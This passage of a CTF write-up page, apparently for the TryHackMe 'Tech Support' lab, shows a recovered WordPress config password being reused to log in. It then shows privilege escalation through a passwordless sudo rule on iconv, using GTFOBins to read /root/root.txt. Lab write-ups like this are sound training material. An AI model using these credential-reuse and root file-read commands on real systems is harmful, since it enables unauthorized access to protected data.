+</span></span><span style="display:flex;"><span> * The wp-config.php creation script uses this file during the
+</span></span><span style="display:flex;"><span> * installation. You don<span style="color:#e6db74">&#39;t have to use the web site, you can
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * copy this file to &#34;wp-config.php&#34; and fill in the values.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * This file contains the following configurations:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * * MySQL settings
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * * Secret keys
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * * Database table prefix
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * * ABSPATH
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @link https://wordpress.org/support/article/editing-wp-config-php/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @package WordPress
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// ** MySQL settings - You can get this info from your web host ** //
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** The name of the database for WordPress */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define( &#39;</span>DB_NAME<span style="color:#e6db74">&#39;, &#39;</span>wpdb<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database username */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define( &#39;</span>DB_USER<span style="color:#e6db74">&#39;, &#39;</span>support<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database password */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define( &#39;</span>DB_PASSWORD<span style="color:#e6db74">&#39;, &#39;</span>ImAScammerLOL!123!<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL hostname */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define( &#39;</span>DB_HOST<span style="color:#e6db74">&#39;, &#39;</span>localhost<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** Database Charset to use in creating database tables. */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define( &#39;</span>DB_CHARSET<span style="color:#e6db74">&#39;, &#39;</span>utf8<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** The Database Collate type. Don&#39;</span>t change this <span style="color:#66d9ef">if</span> in doubt. */
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_COLLATE&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/**#@+
+</span></span><span style="display:flex;"><span> * Authentication Unique Keys and Salts.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * Change these to different unique phrases!
+</span></span><span style="display:flex;"><span> * You can generate these using the <span style="color:#f92672">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * @since 2.6.0
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;AUTH_KEY&#39;</span>,         <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;SECURE_AUTH_KEY&#39;</span>,  <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;LOGGED_IN_KEY&#39;</span>,    <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;NONCE_KEY&#39;</span>,        <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;AUTH_SALT&#39;</span>,        <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;SECURE_AUTH_SALT&#39;</span>, <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;LOGGED_IN_SALT&#39;</span>,   <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;NONCE_SALT&#39;</span>,       <span style="color:#e6db74">&#39;put your unique phrase here&#39;</span> <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/**#@-*/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/**
+</span></span><span style="display:flex;"><span> * WordPress Database Table prefix.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * You can have multiple installations in one database <span style="color:#66d9ef">if</span> you give each
+</span></span><span style="display:flex;"><span> * a unique prefix. Only numbers, letters, and underscores please!
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>$table_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;wp_&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/**
+</span></span><span style="display:flex;"><span> * For developers: WordPress debugging mode.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * Change this to true to enable the display of notices during development.
+</span></span><span style="display:flex;"><span> * It is strongly recommended that plugin and theme developers use WP_DEBUG
+</span></span><span style="display:flex;"><span> * in their development environments.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * For information on other constants that can be used <span style="color:#66d9ef">for</span> debugging,
+</span></span><span style="display:flex;"><span> * visit the documentation.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * @link https://wordpress.org/support/article/debugging-in-wordpress/
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;WP_DEBUG&#39;</span>, false <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/* That<span style="color:#e6db74">&#39;s all, stop editing! Happy publishing. */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** Absolute path to the WordPress directory. */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if ( ! defined( &#39;</span>ABSPATH<span style="color:#e6db74">&#39; ) ) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        define( &#39;</span>ABSPATH<span style="color:#e6db74">&#39;, __DIR__ . &#39;</span>/wordpress/<span style="color:#e6db74">&#39; );
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define(&#39;</span>WP_HOME<span style="color:#e6db74">&#39;, &#39;</span>/wordpress/index.php<span style="color:#e6db74">&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">define(&#39;</span>WP_SITEURL<span style="color:#e6db74">&#39;, &#39;</span>/wordpress/<span style="color:#e6db74">&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/** Sets up WordPress vars and included files. */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">require_once ABSPATH . &#39;</span>wp-settings.php<span style="color:#960050;background-color:#1e0010">&#39;</span>;
+</span></span></code></pre></div><p>I discover this credentials:</p>
+<pre tabindex="0"><code>- Username: scamsite
+- Password: ImAScammerLOL!123!
+</code></pre><h1 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I see all the sudo privilege:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>scamsite@TechSupport:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> scamsite on TechSupport:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User scamsite may run the following commands on TechSupport:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/iconv
+</span></span></code></pre></div><p>With this binary I can read all file, I use this site to find a way to exploit it <code>https://gtfobins.github.io/gtfobins/iconv/</code></p>
+<p>I set the environment variable &ldquo;LFILE&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>scamsite@TechSupport:~$ export LFILE<span style="color:#f92672">=</span>/root/root.txt
+</span></span><span style="display:flex;"><span>scamsite@TechSupport:~$ env
+</span></span><span style="display:flex;"><span>XDG_SESSION_ID<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>LFILE<span style="color:#f92672">=</span>/root/root.txt
+</span></span><span style="display:flex;"><span>TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/bash
+</span></span><span style="display:flex;"><span>SSH_CLIENT<span style="color:#f92672">=</span>10.8.21.1 <span style="color:#ae81ff">34114</span> <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>SSH_TTY<span style="color:#f92672">=</span>/dev/pts/0
+</span></span><span style="display:flex;"><span>USER<span style="color:#f92672">=</span>scamsite
+</span></span><span style="display:flex;"><span>LS_COLORS<span style="color:#f92672">=</span>rs<span style="color:#f92672">=</span>0:di<span style="color:#f92672">=</span>01;34:ln<span style="color:#f92672">=</span>01;36:mh<span style="color:#f92672">=</span>00:pi<span style="color:#f92672">=</span>40;33:so<span style="color:#f92672">=</span>01;35:do<span style="color:#f92672">=</span>01;35:bd<span style="color:#f92672">=</span>40;33;01:cd<span style="color:#f92672">=</span>40;33;01:or<span style="color:#f92672">=</span>40;31;01:mi<span style="color:#f92672">=</span>00:su<span style="color:#f92672">=</span>37;41:sg<span style="color:#f92672">=</span>30;43:ca<span style="color:#f92672">=</span>30;41:tw<span style="color:#f92672">=</span>30;42:ow<span style="color:#f92672">=</span>34;42:st<span style="color:#f92672">=</span>37;44:ex<span style="color:#f92672">=</span>01;32:*.tar<span style="color:#f92672">=</span>01;31:*.tgz<span style="color:#f92672">=</span>01;31:*.arc<span style="color:#f92672">=</span>01;31:*.arj<span style="color:#f92672">=</span>01;31:*.taz<span style="color:#f92672">=</span>01;31:*.lha<span style="color:#f92672">=</span>01;31:*.lz4<span style="color:#f92672">=</span>01;31:*.lzh<span style="color:#f92672">=</span>01;31:*.lzma<span style="color:#f92672">=</span>01;31:*.tlz<span style="color:#f92672">=</span>01;31:*.txz<span style="color:#f92672">=</span>01;31:*.tzo<span style="color:#f92672">=</span>01;31:*.t7z<span style="color:#f92672">=</span>01;31:*.zip<span style="color:#f92672">=</span>01;31:*.z<span style="color:#f92672">=</span>01;31:*.Z<span style="color:#f92672">=</span>01;31:*.dz<span style="color:#f92672">=</span>01;31:*.gz<span style="color:#f92672">=</span>01;31:*.lrz<span style="color:#f92672">=</span>01;31:*.lz<span style="color:#f92672">=</span>01;31:*.lzo<span style="color:#f92672">=</span>01;31:*.xz<span style="color:#f92672">=</span>01;31:*.bz2<span style="color:#f92672">=</span>01;31:*.bz<span style="color:#f92672">=</span>01;31:*.tbz<span style="color:#f92672">=</span>01;31:*.tbz2<span style="color:#f92672">=</span>01;31:*.tz<span style="color:#f92672">=</span>01;31:*.deb<span style="color:#f92672">=</span>01;31:*.rpm<span style="color:#f92672">=</span>01;31:*.jar<span style="color:#f92672">=</span>01;31:*.war<span style="color:#f92672">=</span>01;31:*.ear<span style="color:#f92672">=</span>01;31:*.sar<span style="color:#f92672">=</span>01;31:*.rar<span style="color:#f92672">=</span>01;31:*.alz<span style="color:#f92672">=</span>01;31:*.ace<span style="color:#f92672">=</span>01;31:*.zoo<span style="color:#f92672">=</span>01;31:*.cpio<span style="color:#f92672">=</span>01;31:*.7z<span style="color:#f92672">=</span>01;31:*.rz<span style="color:#f92672">=</span>01;31:*.cab<span style="color:#f92672">=</span>01;31:*.jpg<span style="color:#f92672">=</span>01;35:*.jpeg<span style="color:#f92672">=</span>01;35:*.gif<span style="color:#f92672">=</span>01;35:*.bmp<span style="color:#f92672">=</span>01;35:*.pbm<span style="color:#f92672">=</span>01;35:*.pgm<span style="color:#f92672">=</span>01;35:*.ppm<span style="color:#f92672">=</span>01;35:*.tga<span style="color:#f92672">=</span>01;35:*.xbm<span style="color:#f92672">=</span>01;35:*.xpm<span style="color:#f92672">=</span>01;35:*.tif<span style="color:#f92672">=</span>01;35:*.tiff<span style="color:#f92672">=</span>01;35:*.png<span style="color:#f92672">=</span>01;35:*.svg<span style="color:#f92672">=</span>01;35:*.svgz<span style="color:#f92672">=</span>01;35:*.mng<span style="color:#f92672">=</span>01;35:*.pcx<span style="color:#f92672">=</span>01;35:*.mov<span style="color:#f92672">=</span>01;35:*.mpg<span style="color:#f92672">=</span>01;35:*.mpeg<span style="color:#f92672">=</span>01;35:*.m2v<span style="color:#f92672">=</span>01;35:*.mkv<span style="color:#f92672">=</span>01;35:*.webm<span style="color:#f92672">=</span>01;35:*.ogm<span style="color:#f92672">=</span>01;35:*.mp4<span style="color:#f92672">=</span>01;35:*.m4v<span style="color:#f92672">=</span>01;35:*.mp4v<span style="color:#f92672">=</span>01;35:*.vob<span style="color:#f92672">=</span>01;35:*.qt<span style="color:#f92672">=</span>01;35:*.nuv<span style="color:#f92672">=</span>01;35:*.wmv<span style="color:#f92672">=</span>01;35:*.asf<span style="color:#f92672">=</span>01;35:*.rm<span style="color:#f92672">=</span>01;35:*.rmvb<span style="color:#f92672">=</span>01;35:*.flc<span style="color:#f92672">=</span>01;35:*.avi<span style="color:#f92672">=</span>01;35:*.fli<span style="color:#f92672">=</span>01;35:*.flv<span style="color:#f92672">=</span>01;35:*.gl<span style="color:#f92672">=</span>01;35:*.dl<span style="color:#f92672">=</span>01;35:*.xcf<span style="color:#f92672">=</span>01;35:*.xwd<span style="color:#f92672">=</span>01;35:*.yuv<span style="color:#f92672">=</span>01;35:*.cgm<span style="color:#f92672">=</span>01;35:*.emf<span style="color:#f92672">=</span>01;35:*.ogv<span style="color:#f92672">=</span>01;35:*.ogx<span style="color:#f92672">=</span>01;35:*.aac<span style="color:#f92672">=</span>00;36:*.au<span style="color:#f92672">=</span>00;36:*.flac<span style="color:#f92672">=</span>00;36:*.m4a<span style="color:#f92672">=</span>00;36:*.mid<span style="color:#f92672">=</span>00;36:*.midi<span style="color:#f92672">=</span>00;36:*.mka<span style="color:#f92672">=</span>00;36:*.mp3<span style="color:#f92672">=</span>00;36:*.mpc<span style="color:#f92672">=</span>00;36:*.ogg<span style="color:#f92672">=</span>00;36:*.ra<span style="color:#f92672">=</span>00;36:*.wav<span style="color:#f92672">=</span>00;36:*.oga<span style="color:#f92672">=</span>00;36:*.opus<span style="color:#f92672">=</span>00;36:*.spx<span style="color:#f92672">=</span>00;36:*.xspf<span style="color:#f92672">=</span>00;36:
+</span></span><span style="display:flex;"><span>MAIL<span style="color:#f92672">=</span>/var/mail/scamsite
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/scamsite/bin:/home/scamsite/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</span></span><span style="display:flex;"><span>PWD<span style="color:#f92672">=</span>/home/scamsite
+</span></span><span style="display:flex;"><span>LANG<span style="color:#f92672">=</span>en_US.UTF-8
+</span></span><span style="display:flex;"><span>SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>HOME<span style="color:#f92672">=</span>/home/scamsite
+</span></span><span style="display:flex;"><span>LOGNAME<span style="color:#f92672">=</span>scamsite
+</span></span><span style="display:flex;"><span>XDG_DATA_DIRS<span style="color:#f92672">=</span>/usr/local/share:/usr/share:/var/lib/snapd/desktop
+</span></span><span style="display:flex;"><span>SSH_CONNECTION<span style="color:#f92672">=</span>10.8.21.1 <span style="color:#ae81ff">34114</span> 10.10.35.160 <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>LESSOPEN<span style="color:#f92672">=</span>| /usr/bin/lesspipe %s
+</span></span><span style="display:flex;"><span>XDG_RUNTIME_DIR<span style="color:#f92672">=</span>/run/user/1000
+</span></span><span style="display:flex;"><span>LESSCLOSE<span style="color:#f92672">=</span>/usr/bin/lesspipe %s %s
+</span></span><span style="display:flex;"><span>_<span style="color:#f92672">=</span>/usr/bin/env
+</span></span></code></pre></div><p>I get the <code>root flag</code>:</p>
+<pre tabindex="0"><code>scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 &#34;$LFILE&#34;
+851b8233a8c09400ec30651bd1529bf1ed02790b  -
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/lian_yu/">
+                <span class="button__icon">←</span>
+                <span class="button__text">THM Writeup - Lian_Yu (Easy)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/death_note/">
+                <span class="button__text">VulnHub Writeup - Death Note (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
